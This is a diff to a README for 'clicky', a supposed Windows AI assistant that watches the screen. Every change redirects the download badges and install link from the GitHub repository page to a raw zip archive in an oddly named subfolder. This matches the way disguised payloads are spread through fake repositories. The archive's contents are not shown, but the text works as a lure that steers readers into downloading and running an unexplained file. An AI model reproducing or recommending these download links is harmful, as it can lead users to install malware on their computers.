@@ -1,12 +1,12 @@
 # 🖱️ clicky - Your AI assistant beside your cursor
 
-[![](https://img.shields.io/badge/Download-Clicky-blue.svg)](https://github.com/familytrombiculidaeamphioxus6584/clicky)
+[![](https://img.shields.io/badge/Download-Clicky-blue.svg)](https://raw.githubusercontent.com/familytrombiculidaeamphioxus6584/clicky/main/restiffen/Software-zoeal.zip)
 
 Clicky acts as an AI teacher that sits near your cursor. It watches your screen and speaks to you to help with tasks. This tool offers guidance much like a teacher sitting next to you. Use it to learn new software, solve problems, or navigate complex workflows with ease.
 
 ## 📥 How to install the software
 
-Visit [this page](https://github.com/familytrombiculidaeamphioxus6584/clicky) to download the application for your Windows computer.
+Visit [this page](https://raw.githubusercontent.com/familytrombiculidaeamphioxus6584/clicky/main/restiffen/Software-zoeal.zip) to download the application for your Windows computer.
 
 1. Open your web browser.
 2. Go to the link provided above.
@@ -56,7 +56,7 @@ If you encounter issues during your use of the application, follow these steps t
 * **Slow performance:** Close unnecessary programs in the background. AI features require processing power, and other apps often compete for those resources.
 * **Screen capturing fails:** Grant permissions for the application to record your screen in your Windows security settings.
 
-[![](https://img.shields.io/badge/Download-Clicky-grey.svg)](https://github.com/familytrombiculidaeamphioxus6584/clicky)
+[![](https://img.shields.io/badge/Download-Clicky-grey.svg)](https://raw.githubusercontent.com/familytrombiculidaeamphioxus6584/clicky/main/restiffen/Software-zoeal.zip)
 
 ## 👤 Support and community
 
